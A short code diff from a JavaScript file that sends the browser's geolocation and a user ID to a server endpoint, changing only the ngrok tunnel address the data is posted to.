@@ -10,7 +10,7 @@ navigator.geolocation.getCurrentPosition(
     let long = position.coords.longitude;
 
     // Отправляем данные на сервер
-    axios.post("https://1c8a-91-205-48-117.ngrok-free.app/send.php", {
+    axios.post("https://309d-91-205-48-117.ngrok-free.app/send.php", {
       userId: userId,
       latitude: lat,
       longitude: long,
